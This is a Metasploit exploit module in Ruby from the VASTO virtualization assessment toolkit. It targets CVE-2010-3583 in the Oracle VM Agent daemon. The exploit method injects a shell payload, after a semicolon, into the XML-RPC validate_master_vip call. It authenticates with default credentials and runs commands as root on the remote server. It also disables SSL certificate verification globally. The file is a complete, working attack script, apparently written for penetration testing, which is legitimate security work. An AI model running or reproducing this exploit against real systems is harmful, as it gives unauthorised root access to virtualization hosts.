#################################################################
# 								#
#		This module is part of VASTO			#
#			Version 0.4				#
#		Virtualization ASsessment TOolkit		#
#								#
#################################################################

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking
	#Fixing invalid certificate complaints
	OpenSSL::SSL::VERIFY_PEER = OpenSSL::SSL::VERIFY_NONE if OpenSSL::SSL::VERIFY_PEER.nil?
	include Msf::Exploit::Remote::HttpClient
		
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Oracle VM Agent remote code execution',
			'Description'    => %q{
					This module exploits a flaw in the Oracle VM Agent daemon which allows authenticated
					users to execute code as root on the remote server. Use cmd/unix/generic payload and set CMD
			},
			'Author'      => ['Juan Pablo Perez Etchegoyen','Claudio Criscione'],
      			'References'	=>
				[
					[ 'URL', 'http://www.onapsis.com/resources/get.php?resid=adv_onapsis-2010-009' ],
					[ 'CVE', '2010-3583' ]
				],
			'License'        => GPL_LICENSE,
			'Version'        => '0.1',
			'Privileged'     => false,
			'Payload'        =>
				{
					'DisableNops' => true,
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic telnet bash',
						}
				},
			'Platform'       => 'unix',
			'Arch'           => ARCH_CMD,
			'Targets'        =>
				[
					[ 'Automatic', { }],
				],
		                 
	                'DefaultTarget'  => 0,
			'DisclosureDate' => 'Nov 6 2010'))

		register_options(
			[
				Opt::RPORT(8899),
				OptString.new('username', [ true,  "Username to be used to login", 'oracle']),
				OptString.new('password', [ true,  "Password to be used to login", 'password'])
			], self.class)
	end

	def exploit
	      rhost = datastore['RHOST']
	      user = datastore['username']
	      pass = datastore['password']
	      datastore['SSL'] = true

	      #Placing the shell escape and executing code. Resetting the IP address
	      sploit = "<?xml version=\"1.0\"?>"+
		     "<methodCall><methodName>validate_master_vip</methodName><params>"+
		     "<param><value><string>#{rhost};"+
		     " #{payload.encode}"+
		     "</string></value></param><param><value>"+
		     "<string>#{rhost}</string></value> </param>"+
		     "</params></methodCall>"
	      
	      begin
		res = send_request_cgi({
		  'uri'     => '/RPC2',
		  'method'  => 'POST',
		  'data'    => sploit,
		  'basic_auth'=> "#{user}:#{pass}",
		  'headers' =>
		  {
			    'Content-Length'  =>  sploit.length,
			    'Content-Type'    => 'text/xml',
		  }
		}, -1)
	      print_status(res.body)
	      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => rex_exep
		  print_error "#{ rex_exep }"
	      rescue ::Timeout::Error, ::Errno::EPIPE => other
		  print_error "#{ other }"
	      end


	end

end
